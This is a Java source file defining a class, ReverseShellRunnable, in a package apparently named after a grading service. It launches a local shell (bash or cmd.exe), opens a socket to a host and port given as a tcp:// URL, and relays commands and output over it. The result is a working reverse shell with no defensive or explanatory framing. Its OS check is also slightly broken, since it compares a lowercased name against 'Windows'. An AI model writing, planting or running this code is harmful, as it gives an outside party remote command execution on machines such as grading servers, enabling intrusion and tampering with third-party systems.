package gradeskope.shell;

import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.Socket;

public class ReverseShellRunnable implements Runnable {

  private static final String protocolPrefix = "tcp://";

  private final String host;
  private int port;

  public ReverseShellRunnable(String targetURL) {
    if (targetURL.startsWith(protocolPrefix)) {
      targetURL = targetURL.substring(protocolPrefix.length());
    }
    String[] hostAndPort = targetURL.split(":");
    host = hostAndPort[0];
    port = Integer.parseInt(hostAndPort[1]);
  }

  @Override
  public void run() {
    String cmd = System.getProperty("os.name").toLowerCase().contains("Windows") ? "cmd.exe" : "bash";

    try {
      Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
      Socket s = new Socket(host, port);
      InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
      OutputStream po = p.getOutputStream(), so = s.getOutputStream();
      while (!s.isClosed()) {
        while (pi.available() > 0) {
          so.write(pi.read());
        }
        while (pe.available() > 0) {
          so.write(pe.read());
        }
        while (si.available() > 0) {
          po.write(si.read());
        }
        so.flush();
        po.flush();
        Thread.sleep(50);
        try {
          p.exitValue();
          break;
        } catch (Exception ignored) {
        }
      }
      p.destroy();
      s.close();
    } catch (IOException | InterruptedException e) {
      throw new RuntimeException(e);
    }
  }
}
